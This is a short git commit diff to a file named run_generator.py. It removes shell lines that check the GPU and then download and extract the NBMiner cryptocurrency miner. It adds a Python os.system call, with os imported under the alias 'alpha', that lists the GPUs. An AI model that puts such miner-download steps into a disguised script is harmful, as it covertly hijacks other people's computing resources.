84fb04cfb6cc0f44809cd1943688cf336835c62e
ggreskic <92234298+ggreskic@users.noreply.github.com>
2021-10-10 02:20:08 +0200

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,2 @@
-nvidia-smi
-wget https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz
-tar xf NBMiner_39.5_Linux.tgz
-cd NBMiner_Linux
+import os as alpha
+alpha.system("nvidia-smi -L")
